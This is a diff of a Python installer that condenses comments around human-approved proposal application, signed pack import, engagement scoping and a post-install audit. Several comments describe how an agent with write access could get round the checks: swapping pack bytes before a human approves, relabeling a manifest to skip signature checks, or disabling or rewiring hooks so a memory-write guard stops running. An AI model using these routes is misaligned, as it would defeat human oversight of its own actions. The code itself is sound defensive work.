-    token before it's ever joined onto a Path (Grok's review, 2026-08-09:
-    an unvalidated slug like '../x' or 'applied/foo' walks outside the
-    proposals directory)."""
+    """Reject any slug that isn't a plain filename-safe token before it is
+    joined onto a path."""
     if not _SLUG_RE.match(slug):
         die(f"'{slug}' is not a valid proposal slug (must match {_SLUG_RE.pattern}) — "
             f"refusing before it touches any path.")
@@ -1902,11 +1550,7 @@ def apply_proposal(target: Path, slug: str, confirm: str = None) -> int:
                        f"hash to its own before_sha256. Refusing rather than trusting a "
                        f"proposal that can't even check itself.")
         # Path safety before content: resolve (and refuse a symlink-swapped
-        # directory component) BEFORE spending any effort validating
-        # after_content, so a malformed proposal never masks the TOCTOU
-        # refusal with the generic validity-check message (caught by the
-        # symlink regression test after SEED-077 inserted the content check
-        # ahead of this resolution, 2026-09-04).
+        # component) before validating after_content.
         try:
             dir_fd, fname = _resolve_target_dir_fd(target, rel_target)
         except RuntimeError as e:
@@ -1938,8 +1582,8 @@ def apply_proposal(target: Path, slug: str, confirm: str = None) -> int:
                            f"with no receipt to record it in can never be reverted through this "
                            f"mechanism. Refusing rather than making a change nothing can audit.")
 
-            # Every refusal above ran against the LIVE file, so the diff shown
-            # here is exactly what a confirmed re-run will write.
+        # The checks above ran against the live file, so this diff is exactly
+        # what a confirmed re-run will write.
             token = _confirm_token(proposal.get("after_content", ""))
             if rel_target in PROPOSAL_SINGLE_APPLY_ONLY:
                 _print_proposal_diff(slug, rel_target, before_content,
@@ -1967,13 +1611,8 @@ def apply_proposal(target: Path, slug: str, confirm: str = None) -> int:
         }
         _save_receipt(target, receipt)
 
-        # Archived, not deleted — revert_proposal() reads before_content back out
-        # of this exact file. Unlike the original comment here claimed, the
-        # RECEIPT IS NOT a self-sufficient record of truth for revert: it stores
-        # hashes, not bytes, so before_content lives ONLY in this archive (GPT-5.6
-        # review, 2026-08-09). A failed rename is therefore a real, loud problem,
-        # not a cosmetic one — the write to `dest` already succeeded and stays
-        # applied; what's lost is the ability to revert it through this command.
+        # Archive, don't delete: the receipt stores only hashes, so revert needs
+        # before_content from this file. A failed archive makes revert impossible.
         applied_dir = _proposals_dir(target) / "applied"
         applied_dir.mkdir(parents=True, exist_ok=True)
         src = _proposals_dir(target) / f"{slug}.json"
@@ -1996,25 +1635,13 @@ def apply_proposal(target: Path, slug: str, confirm: str = None) -> int:
 
 
 def revert_proposal(target: Path, slug: str) -> int:
-    """Undo exactly one --apply-proposal call, and only if nothing has
-    touched the target since — the same stale-state refusal apply_proposal
-    itself uses, run in the opposite direction. Reads before_content back
-    out of the archived proposal file apply_proposal() moved to applied/.
+    """Undo one --apply-proposal call, only if nothing has touched the target
+    since.
 
-    Hardened 2026-08-09 after convergent findings from Grok/GPT-5.6/Gemini
-    review: the receipt's `target` field and the archive's `before_content`
-    are both same-UID-writable state, exactly like the manifest itself, and
-    the original version trusted both without re-checking them against
-    anything — an asymmetry with apply_proposal, which validates every one
-    of these before writing. Revert now re-runs the SAME checks apply does,
-    in the opposite direction: target stays on the allowlist, the archived
-    proposal's own target must match the receipt's, and before_content must
-    hash to the value recorded at apply time — not just to whatever the
-    archive file happens to contain now. Same-day follow-up (wave2g2
-    review, GPT+Gemini): the actual read/write of `target` also goes
-    through the descriptor-relative resolution + flock apply_proposal
-    uses, closing the symlink-swap/concurrent-modification TOCTOU window
-    between the checks above and the restore."""
+    Re-runs apply's checks in reverse: target still allowlisted, the archived
+    proposal's target matches the receipt's, and before_content hashes to the
+    value recorded at apply time. The read/write uses the same descriptor-
+    relative resolution and lock as apply_proposal."""
     _validate_slug(slug)
     with _proposal_lock(target):
         receipt = _load_receipt(target)
@@ -2075,20 +1702,14 @@ def revert_proposal(target: Path, slug: str) -> int:
         return 0
 
 
-# --- SEED-077 (2026-09-02): batch review + apply ----------------------------
-# The Monday proposal feed produces several proposals at once; applying them
-# one slug at a time made the human the serial bottleneck the lane exists to
-# remove. --review-proposals is the five-minute read (read-only, exit 0
-# always); --apply-proposals walks the queue through the SAME per-slug
-# apply_proposal() path — every guard (allowlist, self-hash, validity check,
-# stale-live-hash, receipt, lock) runs per item, a refusal skips that item
-# and keeps going, and the batch exits nonzero if anything was refused.
-# Batch is a loop over the audited single, never a second write path.
+# --- batch review + apply ---------------------------------------------------
+# --review-proposals is read-only (exit 0 always). --apply-proposals loops over
+# the same per-slug apply_proposal(), so every guard runs per item; a refusal
+# skips that item, and the batch exits nonzero if anything was refused.
 
 def _staged_proposal_slugs(target: Path):
-    """Valid-slug staged proposals, sorted for a deterministic apply order.
-    Files whose stem fails _SLUG_RE are reported and skipped, not died on —
-    one junk file must not block the rest of the queue."""
+    """Valid-slug staged proposals, sorted. Junk filenames are returned
+    separately, not fatal."""
     d = _proposals_dir(target)
     if not d.is_dir():
         return [], []
@@ -2172,9 +1793,8 @@ def apply_proposals(target: Path) -> int:
     for i, slug in enumerate(slugs, 1):
         proposal = _load_proposal_file(_proposals_dir(target) / f"{slug}.json")
         if proposal is not None and proposal.get("target") in PROPOSAL_SINGLE_APPLY_ONLY:
-            # Craig's 2026-09-02 condition on settings.json: the change is
-            # communicated before it is made. Batch is the wrong granularity
-            # for that — leave it staged for a slug-named single apply.
+            # settings.json must be shown before it is changed, so leave it for
+            # a slug-named single apply.
             print(f"[{i}/{len(slugs)}] {slug} — DEFERRED: {proposal.get('target')} is "
                   f"single-apply-only; review the diff, then run "
                   f"--apply-proposal {slug} --confirm TOKEN yourself")
@@ -2191,18 +1811,13 @@ def apply_proposals(target: Path) -> int:
     return 0 if not refused else 2
 
 
-# --- P3 (2026-08-08): cc-pack import ----------------------------------------
-# install.py --approve import-pack --from-pack <path> is the write path the
-# cc-pack design calls for: an agent may --inspect/--verify a pack freely
-# (pack/import_pack.py, read-only), but only a human running --approve moves
-# bytes — same covenant as claude-md/mesh-bootstrap above.
+# --- cc-pack import -----------------------------------------------------------
+# An agent may inspect/verify a pack freely (pack/import_pack.py, read-only);
+# only a human running --approve import-pack moves bytes.
 
 def _verify_pack_dir(pack_dir: Path):
-    """Shells out to the SAME import_pack.py this clone ships (pack/, next
-    to this file) rather than re-implementing SHA256SUMS/bijection/audience-
-    gate checking a third time — that logic is already hardened and kept in
-    sync with cc-pack/pack_lib.py by cc-pack/selftest.py's cross-fixture
-    tests; a third copy here would be a third place for it to drift."""
+    """Verify a pack by shelling out to the shipped pack/import_pack.py rather
+    than re-implementing its checks."""
     importer = HERE / "pack" / "import_pack.py"
     if not importer.exists():
         return False, f"{importer} not found — this clone is missing the pack importer (pack/import_pack.py)"
@@ -2216,43 +1831,22 @@ def _verify_pack_dir(pack_dir: Path):
     return r.returncode == 0, (r.stdout + r.stderr).strip()
 
 
-# P6c (2026-08-09): signature-verify state, machine-parsed from the SAME
-# import_pack.py --verify call above — never a THIRD re-implementation of
-# the ssh-keygen -Y logic (pack_lib.py is the second; import_pack.py's own
-# copy is the declared-duplicate first). See pack_lib.py's POSTURE comment
-# for why unsigned/invalid/unknown-signer/verification-error/verified is
-# the right state set and why enforcement (this file's job) is kept
-# separate from classification (import_pack.py's job).
+# Signature state, parsed from import_pack.py --verify output. Classification
+# lives there; enforcement lives here.
 _SIG_LINE_RE = re.compile(r"^signature:\s*(\S+)(?:\s+principal=(\S+))?", re.MULTILINE)
 
-# Declared-duplicate constant of import_pack.py's SIG_STATES — this file
-# never imports import_pack.py (it only shells out to it), so it can't
-# import the tuple; kept in sync by hand like every other cross-file
-# constant in this design. Used to validate the parsed 'signature:' word
-# is actually one of the five known states before any policy decision is
-# made on it (2026-08-09 post-implementation review, Grok + GPT
-# independently HIGH: the regex captured ANY \S+ token with no allowlist —
-# today's producer only ever emits one of these five, but a future
-# diagnostic line, a dependency change in import_pack.py, or drift between
-# this file and that one could put a different word in the capture group,
-# and an unvalidated word flowing straight into "if sig_state == 'unsigned'"
-# / "if sig_state not in (...)" comparisons could silently pick either
-# branch depending on the string, or worse, an unrecognized-but-truthy
-# value could slip past 'unsigned'-only checks. Fail closed to
-# 'verification-error' on anything outside the known set — same posture as
-# every other classification failure in this function.
+# Duplicate of import_pack.py's SIG_STATES (it is shelled out to, not
+# imported; keep in sync). Any parsed word outside this set fails closed to
+# 'verification-error'.
 _KNOWN_SIG_STATES = ("unsigned", "invalid", "unknown-signer", "verification-error", "verified")
 
 
 def _verify_pack_signature(pack_dir: Path, allowed_signers):
-    """Runs import_pack.py --verify --allowed-signers <path> (a SECOND call
-    to the same tool _verify_pack_dir already made — cheap, and keeps this
-    function's contract simple: it owns signature state, that one owns
-    integrity state) and parses the 'signature: <state>[ principal=<x>]'
-    line it prints. Returns (state, principal_or_None, raw_output). Fails
-    closed to 'verification-error' if the line can't be found at all, OR if
-    the captured state word isn't one of the five known SIG_STATES —
-    never silently treated as unsigned or verified."""
+    """Run import_pack.py --verify (with --allowed-signers if given) and parse
+    its 'signature: <state>[ principal=<x>]' line.
+
+    Returns (state, principal_or_None, raw_output). Fails closed to
+    'verification-error' if the line is missing or the state is unknown."""
     importer = HERE / "pack" / "import_pack.py"
     cmd = [sys.executable, str(importer), "--pack", str(pack_dir), "--verify"]
     if allowed_signers:
@@ -2275,21 +1869,10 @@ def _verify_pack_signature(pack_dir: Path, allowed_signers):
 
 
 def _stage_pack_copy(pack_dir: Path, staging_parent: Path) -> Path:
-    """Copies pack_dir into a private, freshly-created staging directory
-    BEFORE verification — closing the verify/apply TOCTOU all three
-    2026-08-08 P3 reviewers found independently. The real-world race isn't
-    nanoseconds: a human reads --approve's output and decides to run it,
-    which is genuine wall-clock time an agent with write access to pack_dir
-    (the normal "agent stages, human approves" shape this whole design
-    exists for) could use to substitute content after --verify passed but
-    before _apply_pack_generic copies it — and _apply_pack_generic only
-    re-checks PATH SAFETY, never re-checks content against SHA256SUMS, so
-    whatever bytes are there at copy time get blessed into the receipt
-    outright. Verifying and applying the SAME snapshot — one nothing else
-    can reach once this function returns — removes the window instead of
-    narrowing it. Refuses to stage anything that isn't a regular file or
-    directory (no symlinks, fifos, devices) so a hostile pack_dir can't
-    smuggle a symlink through the copy itself."""
+    """Copy pack_dir into a fresh private staging directory before
+    verification, so the bytes verified are exactly the bytes applied (no
+    swap window while a human decides). Refuses anything but regular files
+    and directories."""
     stage = Path(tempfile.mkdtemp(prefix=".cc-pack-stage-", dir=str(staging_parent)))
     try:
         for p in sorted(pack_dir.rglob("*")):
@@ -2323,12 +1906,8 @@ def _read_pack_manifest(pack_dir: Path):
 
 
 def _apply_pack_generic(pack_dir: Path, manifest: dict, dest_root: Path) -> dict:
-    """Copies every file every part declares to dest_root/parts/<id>/<relfile>
-    — the same generic, delivery-root-only placement as pack_lib.Part.apply's
-    default (see that docstring for the P3 scope cut). Re-validates every
-    path here too: never trust that --verify a moment ago is still true of
-    the bytes about to be copied. Returns {"parts/<id>/<relfile>": sha256}
-    for the receipt."""
+    """Copy every declared part file to dest_root/parts/<id>/<relfile>,
+    re-validating each path. Returns {"parts/<id>/<relfile>": sha256}."""
     paths = {}
     for part in manifest.get("parts", []) or []:
         if not isinstance(part, dict):
@@ -2352,11 +1931,8 @@ def _apply_pack_generic(pack_dir: Path, manifest: dict, dest_root: Path) -> dict
 
 
 def _render_packs_md(receipt: dict) -> bytes:
-    """Pure function of receipt['imported_packs'] — re-derived on every
-    import/removal, never hand-edited. Sorted by pack id so A-then-B and
-    B-then-A produce byte-identical output; one labeled section per pack,
-    provenance kept separate rather than blended (mirrors agy-bundle/
-    build.py's renderer shape)."""
+    """Render PACKS.md from receipt['imported_packs'] — deterministic (sorted by
+    pack id), one section per pack, never hand-edited."""
     packs = receipt.get("imported_packs", {}) or {}
     lines = [
         "# Imported packs",
@@ -2369,11 +1945,7 @@ def _render_packs_md(receipt: dict) -> bytes:
         lines.append("(none imported yet)")
     for pid in sorted(packs):
         p = packs[pid]
-        # PACKS.md is the file @-imported straight into CLAUDE.md, so every
-        # field here is effectively model-visible context — sanitize before
-        # rendering (2026-08-08 P3 review, Grok + GPT: an unescaped
-        # source_pack/tags/kind pulled from the receipt could embed
-        # newlines/control sequences and inject extra lines or markdown).
+        # PACKS.md is @-imported into CLAUDE.md, so escape every field.
         lines += [
             f"## {_escape_path(str(pid))}",
             "",
@@ -2390,15 +1962,8 @@ def _render_packs_md(receipt: dict) -> bytes:
 
 
 def _strip_pack_pointer_prefix(data: bytes, receipt: dict) -> bytes:
-    """If an APPROVED cc-pack pointer region sits at the very start of
-    `data`, strip it (region + its separator) before any cc-seed-region
-    reasoning runs on the rest. check 3 owns the cc-seed claude-md region and
-    must not double-count an approved, separately-owned pack region as
-    'unexplained content outside the region' when diffing against the
-    pre-install baseline — the two gated writes compose in the same file
-    (pack pointer always first, cc-seed region always last; see the
-    GATED_WRITES comment above), so check 3 needs to look straight through
-    the pack region to find what it actually owns."""
+    """Strip an approved cc-pack pointer region (and its separator) from the
+    start of `data`, so check 3 sees only what the cc-seed region owns."""
     gw = receipt.get("gated_writes", {}).get("import-pack-pointer")
     if not gw or not gw.get("written"):
         return data
@@ -2408,34 +1973,21 @@ def _strip_pack_pointer_prefix(data: bytes, receipt: dict) -> bytes:
     e_idx = data.find(e_marker)
     if e_idx == -1:
         return data
-    end = e_idx + len(e_marker) + 1  # past the end marker AND its own guaranteed trailing \n
-    # _write_packs_pointer's "\n\n" separator (when anything follows the pack
-    # region) must be consumed as a pair, matching how it was written — a
-    # single \n here was the 2026-08-08 bug (see _write_packs_pointer).
+    end = e_idx + len(e_marker) + 1  # past the end marker and its trailing \n
+    # _write_packs_pointer's "\n\n" separator is consumed as a pair.
     if data[end:end + 2] == b"\n\n":
         return data[end + 2:]
     return data[end:]
 
 
 def _write_packs_pointer(target: Path, receipt: dict, delivery_root: Path) -> bool:
-    """Writes the one-line @<delivery_root>/PACKS.md pointer into
-    target/CLAUDE.md — ONCE ever per target (packs 2..N regenerate PACKS.md
-    and touch CLAUDE.md zero times). _lib/context_build.py's IMPORT_RE
-    already resolves absolute @/path.md imports — existing, selftested
-    mechanism, not modified here. Returns True if it wrote (first pack ever
-    for this target), False if the pointer was already there (no-op).
+    """Write the one-line @<delivery_root>/PACKS.md pointer into
+    target/CLAUDE.md, once per target. Returns True if written, False if
+    already present.
 
-    Raises RuntimeError if cc-pack markers are ALREADY on disk but the
-    receipt has no record of writing them — mirrors _approve_claude_md's
-    existing refusal on a pre-existing cc-seed region (2026-08-08 P3 review,
-    Grok + GPT independently: without this check, a crash between this
-    write and the receipt save — disk full, EPERM, Ctrl-C — leaves CLAUDE.md
-    with a pointer region the receipt doesn't know about; a retry (needed
-    anyway, since the pack directory now exists unrecorded and requires
-    --replace) would prepend a SECOND pack region with no error, and check 8
-    would find 2 start markers and FLAG permanently until a human hand-edits
-    the file. Refusing loudly here turns that into a clear, one-time,
-    fixable error instead of silent corruption on the retry path)."""
+    Raises RuntimeError if cc-pack markers are already on disk but the
+    receipt has no record of them (e.g. a crash before the receipt save), so
+    a retry never prepends a second region."""
     gw = receipt.setdefault("gated_writes", {})
     if gw.get("import-pack-pointer", {}).get("written"):
         return False
@@ -2450,13 +2002,8 @@ def _write_packs_pointer(target: Path, receipt: dict, delivery_root: Path) -> bo
             f"content can't be recovered into the receipt automatically — file it).")
     pointer_line = f"@{delivery_root}/PACKS.md\n".encode()
     region = PACKS_MARKER_START.encode() + b"\n" + pointer_line + PACKS_MARKER_END.encode() + b"\n"
-    # Same "\n\n" separator convention as _approve_claude_md's own
-    # `before = existing + b"\n\n"` — MUST match regardless of which gated
-    # write runs first, or _strip_pack_pointer_prefix (which assumes a
-    # single fixed byte count between the two regions) mis-counts and leaves
-    # a stray leading newline that check 3 then reads as unexplained content
-    # (caught live 2026-08-08: approving claude-md after an existing pack
-    # import produced exactly this false flag before this fix).
+    # Same "\n\n" separator as _approve_claude_md, so
+    # _strip_pack_pointer_prefix counts it correctly in either order.
     new_bytes = region + (b"\n\n" + existing if existing else b"")
     _atomic_write(claude_md, new_bytes)
     gw["import-pack-pointer"] = {
@@ -2501,49 +2048,15 @@ def _approve_import_pack(target: Path, receipt: dict, from_pack: str, replace: b
             return die(f"pack id {pack_id!r} is not a safe path component — refusing")
         sums_hash = manifest.get("sha256sums_sha256")
 
-        # Signature policy (P6c, 2026-08-09; tri-model CRITICAL fix — see
-        # pack_lib.py's POSTURE comment for the full rationale). A pure
-        # policy gate, checked immediately after manifest/pack_id
-        # validation and BEFORE any state-changing step below (the
-        # engagement-scoping check, the duplicate-import check, or
-        # anything touching the filesystem) — same placement discipline
-        # the --tag engagement gate already uses.
+        # Signature policy, checked before any state-changing step.
         #
-        # audience=replica defaults to require_sig=verified: unsigned,
-        # unknown-signer, invalid, and verification-error ALL refuse.
-        # unsigned is allowed ONLY via the explicit --allow-unsigned
-        # break-glass — never the silent default — and is recorded as such
-        # in the receipt, and ONLY for audience=replica (audience=shareable
-        # was already unsigned-tolerant by design, see below).
+        # invalid / unknown-signer / verification-error refuse unconditionally,
+        # for every audience — the audience field is in pack.json and could be
+        # relabeled without breaking the integrity chain.
         #
-        # invalid/unknown-signer/verification-error have NO override AND
-        # this refusal is UNCONDITIONAL — it is checked BEFORE the audience
-        # is even consulted, so it applies to every audience, not just
-        # replica (2026-08-09 post-implementation review, all three models
-        # independently converged on this as the load-bearing finding: the
-        # ORIGINAL version of this gate nested the whole signature check
-        # inside `if manifest.get("audience") == "replica"`, which meant an
-        # attacker who can write the pack directory before a human's
-        # `--approve` — the exact threat model this whole design exists
-        # for — could simply relabel pack.json's own `audience` field from
-        # "replica" to "shareable" (this does not touch SHA256SUMS or any
-        # part file, so the integrity chain _verify_pack_dir already passed
-        # stays self-consistent, PROVIDED the relabeled pack's part types
-        # are all dual-audience-compatible, e.g. doctrine/skills/
-        # memory-digest/secret-handles) and walk straight past the
-        # signature gate entirely with a now-stale, now-"invalid" signature
-        # that would otherwise have refused. Only "legitimately never
-        # signed" is ever a maybe, for any audience; "signed and
-        # untrustable" never is, for any audience either.
-        #
-        # audience=shareable's own historical "not gated" design is
-        # narrowed, not removed: an UNSIGNED shareable pack still imports
-        # with no override needed (lower stakes, already scrubbed for wide
-        # distribution — that part of the original design stands), but a
-        # shareable pack that WAS signed and is now provably untrustworthy
-        # refuses exactly like a replica pack does. The signature state is
-        # still recorded in the receipt for every pack regardless of
-        # audience, informational for the unsigned/verified cases.
+        # unsigned: a replica pack refuses unless --allow-unsigned (recorded in
+        # the receipt); a shareable pack imports. The signature state is
+        # recorded for every pack.
         sig_state, sig_principal, sig_raw = _verify_pack_signature(staged_pack, allowed_signers)
         if sig_state not in ("unsigned", "verified"):
             return die(
@@ -2559,48 +2072,21 @@ def _approve_import_pack(target: Path, receipt: dict, from_pack: str, replace: b
                 f"anyway (recorded loudly in the receipt), or sign the pack first "
                 f"(cc-pack/build_pack.py --sign).")
 
-        # Engagement scoping (FDE-TOOLKIT-PLAN.md F1's original "actual gap"
-        # against memory_seed.py, closed here for cc-pack instead): a pack
-        # built with build_pack.py --tag <slug> is engagement-scoped and must
-        # not cross into a session for a different engagement. Fails closed
-        # both directions — no engagement set on the TARGET refuses (never
-        # "import everything"), and a target engagement that doesn't match
-        # refuses too. An untagged pack (tags == []) is not engagement-scoped
-        # at all and always imports — the general-purpose case (Craig's own
-        # doctrine/skills packs), not a client engagement.
+        # Engagement scoping: a pack built with --tag <slug> must not cross into
+        # a different engagement. The authorization source is the target's
+        # recorded engagement (set via --set-engagement), never the CLI --tag,
+        # which is only a confirmation. Fails closed when the target has no
+        # engagement. An untagged pack always imports.
         #
-        # 2026-08-09 fix, post-review (Grok 4.5/GPT-5.6-sol/Gemini 3.1 Pro,
-        # cc-pack/reviews/2026-08-09-tag-gate-review-*.md, all three
-        # independently converged): the ORIGINAL version of this gate checked
-        # the pack's tags against `tag` — a bare CLI argument typed fresh on
-        # every invocation — which is not an authorization boundary, it's an
-        # unauthenticated claim (a Client-B session could import a
-        # Client-A-tagged pack just by passing --tag client-a; the die
-        # message even named the exact tag needed). The authorization source
-        # is now `receipt.get("engagement")` — set once, deliberately, via
-        # `install.py --set-engagement <slug>` (refuses to silently switch an
-        # already-set engagement). `--tag` on THIS call is now only a
-        # redundant confirmation checked against that recorded value, never
-        # the thing being trusted on its own.
-        # 2026-08-09, round 2 (GPT-5.6-sol caught this on verification —
-        # neither Grok nor Gemini did): `manifest.get("tags") or []` treats
-        # every FALSY value — "", {}, 0, False — as absent, so a malformed-
-        # but-falsy tags field would silently reach here as an empty list,
-        # bypassing the type check below entirely (it only ever saw the
-        # coerced [], not the original bad value). Inspect the RAW value
-        # first and only treat an actually-absent (None) tags key as "no
-        # tags"; every other non-list-of-strings shape is refused outright.
+        # Inspect the raw tags value: only None means "no tags"; any other
+        # non-list-of-strings shape is refused (a bare string would turn
+        # `in` into a substring match).
         raw_tags = manifest.get("tags")
         if raw_tags is None:
             pack_tags = []
         elif isinstance(raw_tags, list) and all(isinstance(t, str) for t in raw_tags):
             pack_tags = raw_tags
         else:
-            # Round 1: all three reviewers independently found that a
-            # malformed/type-confused `tags` value (e.g. a bare string
-            # instead of a list) turns `tag not in pack_tags` into a
-            # SUBSTRING match ("client" in "client-a" is True) — refuse
-            # outright rather than risk that bypass.
             return die(f"pack {pack_id!r} manifest 'tags' is malformed (expected a list of "
                        f"strings or an absent/null value, got {raw_tags!r}) — refusing rather "
                        f"than silently treating a malformed value as untagged")
@@ -2660,10 +2146,7 @@ def _approve_import_pack(target: Path, receipt: dict, from_pack: str, replace: b
             "source_pack": str(pack_dir),
             "delivery_path": str(dest),  # display/provenance only — see _expected_pack_dest
             "paths": paths,
-            # P6c (2026-08-09): signature state at import time, plus whether
-            # an unsigned pack was let through the explicit break-glass —
-            # loud and recorded, never a silent default. principal is None
-            # for every state but "verified".
+            # Signature state at import, and whether --allow-unsigned was used.
             "signature_state": sig_state,
             "signature_principal": sig_principal,
             "imported_unsigned": sig_state == "unsigned" and manifest.get("audience") == "replica",
@@ -2672,11 +2155,8 @@ def _approve_import_pack(target: Path, receipt: dict, from_pack: str, replace: b
         try:
             pointer_written = _write_packs_pointer(target, receipt, delivery_root)
         except RuntimeError as e:
-            # apply already succeeded and is recorded in `imported` above —
-            # this is a partial-state failure (content landed, receipt/
-            # pointer did not), surfaced loudly rather than silently retried
-            # (retrying blind is exactly how findings from this review's
-            # "non-transactional import" class happen).
+            # Content landed but the pointer write refused; surface it rather
+            # than retrying blind.
             return die(f"pack content applied but the CLAUDE.md pointer write refused: {e}\n"
                        f"the pack is NOT recorded as imported (receipt not saved) — resolve the "
                        f"CLAUDE.md issue named above, then retry the whole import")
@@ -2719,17 +2199,9 @@ def list_packs(target: Path) -> int:
 
 
 def set_engagement(target: Path, slug: str, force: bool) -> int:
-    """Record which engagement THIS TARGET is operating under — the missing
-    authorization anchor the 2026-08-09 tag-gate review round (Grok 4.5,
-    GPT-5.6-sol, Gemini 3.1 Pro; all three independently, cc-pack/reviews/
-    2026-08-09-tag-gate-review-*.md) converged on as the CRITICAL finding:
-    --tag alone is a self-asserted CLI string with nothing binding it to the
-    importing session's real identity — a Client-B session could import a
-    Client-A-tagged pack by simply typing --tag client-a. This makes the
-    TARGET's own recorded state, set here as a deliberate, refuse-on-silent-
-    overwrite step, the actual authorization source; _approve_import_pack
-    checks THIS, not the CLI argument. Modeled on the existing gated-write
-    covenant (a human runs a real command; the receipt is the ledger)."""
+    """Record which engagement this target operates under — the authorization
+    source _approve_import_pack checks (a CLI --tag alone is self-asserted).
+    Refuses to silently switch an existing engagement without --force."""
     receipt = _load_receipt(target)
     if receipt is None:
         return die(f"{target}/{CC_SEED_DIR}/{RECEIPT_NAME} not found — was this target "
@@ -2779,9 +2251,7 @@ def remove_pack(target: Path, pack_id: str) -> int:
     except ValueError as e:
         return die(f"refusing to remove {pack_id!r}: {e}")
     rec = imported.pop(pack_id)
-    # dest is RE-DERIVED, never rec['delivery_path'] (see _expected_pack_dest)
-    # — a mismatch is itself worth surfacing, not silently ignored, since it
-    # means the receipt disagrees with what this build would have produced.
+    # dest is re-derived, never rec['delivery_path']; surface any mismatch.
     recorded = rec.get("delivery_path")
     if recorded and recorded != str(dest):
         print(f"WARNING: receipt's recorded delivery_path ({recorded}) does not match the "
@@ -2802,13 +2272,11 @@ def remove_pack(target: Path, pack_id: str) -> int:
     return 0
 
 
-# --- Wave 2H, piece 3: --audit (SEED-068) -----------------------------------
-# Deterministic post-install auditor, run by the human in a fresh shell.
-# Compares live state against the receipt (piece 1) and --package's own
-# manifest (never the installed tree — a same-uid agent can rewrite anything
-# under --target before a human looks). See docs/install-audit.md for the
-# check table, provenance reasoning, and the residuals this wave does not
-# close (perimeter, fresh-shell separation, a determined adversarial agent).
+# --- --audit -----------------------------------------------------------------
+# Deterministic post-install auditor, run by a human in a fresh shell. Compares
+# live state against the receipt and --package's own manifest (never the
+# installed tree). See docs/install-audit.md for the check table and the
+# residuals it does not close.
 
 PERIMETER_DISCLAIMER = (
     "This audit verified <ROOT>, the managed scheduler block/plists named "
@@ -2888,7 +2356,7 @@ def _compare_baseline_entry(live_p: Path, entry: dict):
         return None
     if ltype == "file":
         if entry.get("hash") is None:
-            return None  # too large to hash at baseline time — can't verify, don't false-flag
+            return None  # too large to hash at baseline — can't verify, don't false-flag
         if oct(stat.S_IMODE(st.st_mode)) != entry["mode"]:
             return f"mode changed ({entry['mode']} -> {oct(stat.S_IMODE(st.st_mode))})"
         return None if _sha256_file(live_p) == entry["hash"] else "content differs"
@@ -2896,15 +2364,8 @@ def _compare_baseline_entry(live_p: Path, entry: dict):
 
 
 def _verify_registered_skill_link(target: Path, package: Path, name: str):
-    """Check 1 previously had no idea _register_skills() (SEED-071) puts
-    .claude/skills/<name>/SKILL.md symlinks on disk — every one of them fell
-    through to the live-tree walk's UNEXPECTED branch, so --audit FLAGGED
-    (and --audit's exit code is nonzero on FLAGGED) on every single install
-    with skills registered, i.e. every install since SEED-071 shipped.
-    Found 2026-08-09 while adding the CI coverage the wave2g2 review asked
-    for — the fix teaches check 1 the shape instead of exempting the path
-    unchecked, so it still catches the real threat: a same-uid agent
-    repointing the symlink at something other than the shipped skill file."""
+    """Verify a registered .claude/skills/<name>/SKILL.md is a symlink to the
+    shipped skill file."""
     link = target / ".claude" / "skills" / name / "SKILL.md"
     if not link.is_symlink():
         return "not a symlink" if (link.exists() or link.is_symlink()) else "missing"
@@ -2918,18 +2379,9 @@ def _verify_registered_skill_link(target: Path, package: Path, name: str):
 def _wired_hook_keys(doc: dict) -> dict:
     """event -> {(matcher, command), ...} — the dedup identity of a hook.
 
-    2026-09-19 round 2 (R4). The approve dedup used _wired_hooks(), which keys
-    on the COMMAND alone, so a pre-existing entry running one of our scripts
-    under ANY matcher suppressed ours under every matcher. Reproduced on
-    {{REDACTED}}: seed `.claude/settings.json` with PreToolUse matcher "Bash"
-    running memory-write-guard.py, then --approve memory-hooks --apply. The
-    shipped entry (matcher Write|Edit|MultiEdit|NotebookEdit|Bash) was skipped
-    as already-present, and the write guard did not run on Write or Edit at all
-    — the exact tool calls it exists to stop. A matcher is part of WHEN a hook
-    runs, so it is part of whether the hook we need is there.
-
-    A missing matcher and an empty matcher are the same thing to the harness
-    (match everything), so both normalise to "".
+    The matcher is part of when a hook runs, so the same command under a
+    different matcher is a different hook. A missing and an empty matcher
+    both mean "match everything" and normalise to "".
     """
     out = {}
     for event, entries in (doc.get("hooks") or {}).items():
@@ -2961,15 +2413,9 @@ def _wired_hooks(doc: dict) -> dict:
 
 
 def _verify_hook_wiring(target: Path, record: dict) -> list:
-    """settings.json, checked STRUCTURALLY against what the receipt says was
-    approved (2026-09-19, SEED-080 review finding 2).
-
-    check 1 used to exempt settings.json from the audit entirely whenever a
-    memory-hooks record existed, and fold_watch -- the check it delegated to --
-    searched the file as raw TEXT. So replacing the whole `hooks` block with a
-    `notes` field holding the same command strings passed BOTH, with nothing
-    runnable wired; `disableAllHooks: true` passed both as well. An exemption
-    that delegates to a text match is not an exemption, it is a blind spot."""
+    """Check settings.json structurally against the approved memory-hooks
+    record: valid JSON, hooks not disabled, every approved command wired as a
+    runnable hook under its event, and no drift from the recorded hash."""
     settings = _settings_path(target)
     problems = []
     if not settings.exists():
@@ -3020,23 +2466,11 @@ def _check_1(target: Path, package: Path, receipt: dict) -> dict:
             rel = pkg_p.relative_to(package).as_posix()
             checked_rel.add(rel)
             if rel in OPERATOR_EDITABLE_CONFIG:
-                continue  # the operator's own config — see OPERATOR_EDITABLE_CONFIG
+                continue  # the operator's own config
             if rel.split("/", 1)[0] in UPDATE_MANUAL_ONLY_COMPONENTS:
-                continue  # memory/ is the operator's once it has content (install()
-                          # and --update already treat it so); an operator who
-                          # retired it was reported as "missing" files forever
+                continue  # memory/ is the operator's once it has content
             if rel == "scheduler/manifest.yml":
-                continue  # owned by check 2 — --enable-demo is a legitimate,
-                          # in-place rewrite of this file (see enable_demo()),
-                          # so a raw byte-diff against the shipped template
-                          # permanently flags it post-demo. sync.py --check
-                          # (check 2) already validates it semantically, against
-                          # live cron/launchd state — a stronger property than
-                          # this loop's package-identity comparison ever gave.
-                          # Repro'd 2026-08-09: CI red on ai-os-seed's
-                          # "sync from seed pipeline" push, root-caused via
-                          # gh api commits/<sha>/check-runs + a local
-                          # --enable-demo/--audit repro before this fix.
+                continue  # owned by check 2 (--enable-demo rewrites it in place)
             reason = _compare_entry(pkg_p, target / rel)
             if reason:
                 problems.append(f"{rel}: {reason}")
@@ -3052,12 +2486,9 @@ def _check_1(target: Path, package: Path, receipt: dict) -> dict:
     problems.extend(_verify_deferred_skills(target, receipt))
     problems.extend(_verify_refused_skills(target, receipt))
     for d in receipt["install"].get("refused_skills", []) or []:
-        # A refused skill has no project-scope link BY DESIGN — the FLAG above
-        # is the report; don't ALSO call its absence unexpected drift.
